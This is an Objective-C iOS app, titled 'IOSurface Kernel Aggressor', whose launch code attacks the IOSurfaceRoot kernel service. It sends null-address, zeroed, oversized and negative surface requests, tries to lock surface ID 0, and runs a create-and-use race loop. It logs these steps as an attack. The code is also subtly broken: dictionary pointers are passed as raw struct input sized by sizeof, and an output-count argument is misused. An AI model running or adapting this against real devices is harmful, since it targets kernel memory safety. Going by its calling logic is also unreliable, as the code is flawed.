#import <Foundation/Foundation.h>
#import <Metal/Metal.h>
#import <UIKit/UIKit.h>
#import <IOKit/IOKitLib.h>
#import <mach/mach.h>
#import <dlfcn.h>
#import <sys/utsname.h>

@interface AppDelegate : UIResponder <UIApplicationDelegate>
@property (strong, nonatomic) UIWindow *window;
@property (strong, nonatomic) UITextView *logView;
- (void)log:(NSString *)msg;
@end

@implementation AppDelegate

- (void)log:(NSString *)msg {
    NSString *line = [NSString stringWithFormat:@"%@\n", msg];
    NSLog(@"%@", line);
    dispatch_async(dispatch_get_main_queue(), ^{
        self.logView.text = [self.logView.text stringByAppendingString:line];
        NSRange range = NSMakeRange(self.logView.text.length - 1, 1);
        [self.logView scrollRangeToVisible:range];
    });
}

- (BOOL)application:(UIApplication *)application didFinishLaunchingWithOptions:(NSDictionary *)launchOptions {
    self.window = [[UIWindow alloc] initWithFrame:[[UIScreen mainScreen] bounds]];
    self.window.backgroundColor = [UIColor blackColor];
    
    UIViewController *vc = [[UIViewController alloc] init];
    self.logView = [[UITextView alloc] initWithFrame:self.window.bounds];
    self.logView.editable = NO;
    self.logView.font = [UIFont monospacedSystemFontOfSize:11 weight:UIFontWeightRegular];
    self.logView.backgroundColor = [UIColor blackColor];
    self.logView.textColor = [UIColor greenColor];
    vc.view = self.logView;
    
    self.window.rootViewController = vc;
    [self.window makeKeyAndVisible];
    
    [self log:@"=== IOSurface Kernel Aggressor ==="];
    
    struct utsname uts;
    uname(&uts);
    [self log:[NSString stringWithFormat:@"Device: %s | iOS: %@", uts.machine, [[UIDevice currentDevice] systemVersion]]];
    
    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_HIGH, 0), ^{
        [self attackIOSurface];
    });
    
    return YES;
}

- (void)attackIOSurface {
    // Step 1: Open IOSurfaceRoot
    [self log:@"[1] Opening IOSurfaceRoot..."];
    io_service_t root = IOServiceGetMatchingService(0, IOServiceMatching("IOSurfaceRoot"));
    if (!root) {
        [self log:@"FAIL: IOSurfaceRoot not found"];
        return;
    }
    
    io_connect_t conn = 0;
    kern_return_t kr = IOServiceOpen(root, mach_task_self(), 0, &conn);
    IOObjectRelease(root);
    if (kr != KERN_SUCCESS) {
        [self log:[NSString stringWithFormat:@"FAIL: IOServiceOpen: 0x%x", kr]];
        return;
    }
    [self log:@"PASS: IOSurfaceRoot opened"];
    
    // Step 2: Trigger SID: 0x0 error with surface ID 0
    [self log:@"[2] Triggering SID: 0x0 error..."];
    
    // Try to use surface ID 0 directly (the error we saw in logs)
    uint32_t surface_id = 0;
    
    // Craft properties that might cause buffer: 0x0
    NSDictionary *props = @{
        @"IOSurfaceIsGlobal": @YES,
        @"IOSurfaceWidth": @256,
        @"IOSurfaceHeight": @256,
        @"IOSurfaceAllocSize": @65536,
        @"IOSurfacePixelFormat": @1111970369,
        @"IOSurfaceAddress": @0,  // Null address to trigger buffer: 0x0
        @"IOSurfaceOffset": @0,
    };
    
    kr = IOConnectCallMethod(conn, 0, NULL, 0,
        (__bridge CFDictionaryRef)props, sizeof(props),
        NULL, NULL, &surface_id, NULL);
    
    [self log:[NSString stringWithFormat:@"Create with null addr: 0x%x (ID: %u)", kr, surface_id]];
    
    // Step 3: Try multiple variations to trigger different kernel errors
    [self log:@"[3] Firing variations..."];
    
    // Variation A: Zero everything
    NSDictionary *zero = @{
        @"IOSurfaceWidth": @0,
        @"IOSurfaceHeight": @0,
        @"IOSurfaceAllocSize": @0,
    };
    uint32_t sid_a = 0;
    kr = IOConnectCallMethod(conn, 0, NULL, 0,
        (__bridge CFDictionaryRef)zero, sizeof(zero),
        NULL, NULL, &sid_a, NULL);
    [self log:[NSString stringWithFormat:@"Zero surface: 0x%x (ID: %u)", kr, sid_a]];
    
    // Variation B: Huge dimensions (integer overflow attempt)
    NSDictionary *huge = @{
        @"IOSurfaceWidth": @0x10000,
        @"IOSurfaceHeight": @0x10000,
        @"IOSurfaceAllocSize": @0x10000000,
    };
    uint32_t sid_b = 0;
    kr = IOConnectCallMethod(conn, 0, NULL, 0,
        (__bridge CFDictionaryRef)huge, sizeof(huge),
        NULL, NULL, &sid_b, NULL);
    [self log:[NSString stringWithFormat:@"Huge surface: 0x%x (ID: %u)", kr, sid_b]];
    
    // Variation C: Negative-ish values
    NSDictionary *neg = @{
        @"IOSurfaceWidth": @-1,
        @"IOSurfaceHeight": @-1,
        @"IOSurfaceAllocSize": @-1,
    };
    uint32_t sid_c = 0;
    kr = IOConnectCallMethod(conn, 0, NULL, 0,
        (__bridge CFDictionaryRef)neg, sizeof(neg),
        NULL, NULL, &sid_c, NULL);
    [self log:[NSString stringWithFormat:@"Negative surface: 0x%x (ID: %u)", kr, sid_c]];
    
    // Step 4: Try to use surface ID 0 directly (trigger the kernel error we saw)
    [self log:@"[4] Attacking surface ID 0..."];
    
    // Try to lock surface ID 0
    uint64_t input0[1] = {0};
    kr = IOConnectCallMethod(conn, 1, input0, 1, NULL, 0, NULL, NULL, NULL, NULL);
    [self log:[NSString stringWithFormat:@"Lock surface 0: 0x%x", kr]];
    
    // Try to get base address of surface 0
    kr = IOConnectCallMethod(conn, 2, input0, 1, NULL, 0, NULL, NULL, NULL, NULL);
    [self log:[NSString stringWithFormat:@"Get base addr of 0: 0x%x", kr]];
    
    // Step 5: Rapid create/destroy to trigger race
    [self log:@"[5] Race condition test..."];
    for (int i = 0; i < 10; i++) {
        uint32_t sid = 0;
        NSDictionary *p = @{
            @"IOSurfaceWidth": @64,
            @"IOSurfaceHeight": @64,
            @"IOSurfaceAllocSize": @4096,
        };
        kr = IOConnectCallMethod(conn, 0, NULL, 0,
            (__bridge CFDictionaryRef)p, sizeof(p),
            NULL, NULL, &sid, NULL);
        if (kr == KERN_SUCCESS) {
            [self log:[NSString stringWithFormat:@"Created surface %d: ID %u", i, sid]];
            // Immediately try to use it
            uint64_t input[1] = {sid};
            IOConnectCallMethod(conn, 1, input, 1, NULL, 0, NULL, NULL, NULL, NULL);
        }
    }
    
    IOServiceClose(conn);
    [self log:@"=== Attack Complete ==="];
    [self log:@"Check Console for kernel(IOSurface) errors with our PID"];
}

@end

int main(int argc, char *argv[]) {
    @autoreleasepool {
        return UIApplicationMain(argc, argv, nil, NSStringFromClass([AppDelegate class]));
    }
}
